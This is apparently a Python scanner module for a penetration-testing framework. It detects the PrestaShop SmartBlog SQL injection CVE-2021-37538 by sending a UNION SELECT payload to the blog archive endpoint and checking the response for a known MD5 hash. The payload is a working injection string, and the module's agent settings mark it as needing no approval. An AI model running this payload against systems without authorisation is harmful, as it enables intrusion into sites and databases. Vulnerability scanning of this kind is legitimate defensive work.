#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PrestaShop SmartBlog by SmartDataSoft < 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PrestaShop SmartBlog <4.0.6 - SQL Injection Detection',
        'description': 'PrestaShop SmartBlog by SmartDataSoft < 4.0.6 is vulnerable to a SQL injection vulnerability in the blog archive functionality.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'prestashop', 'smartblog', 'sqli', 'smartdatasoft', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.sorcery.ie/posts/smartblog_sqli/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-37538',
            'https://classydevs.com/free-modules/smartblog/',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-37538',
    }

    def run(self):
        r = self.http_request(method="GET", path='/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('c5fe25896e49ddfe996db7508cf00534',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="PrestaShop SmartBlog <4.0.6 - SQL Injection detected",
                path='/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-',
            )
            return True
        return False

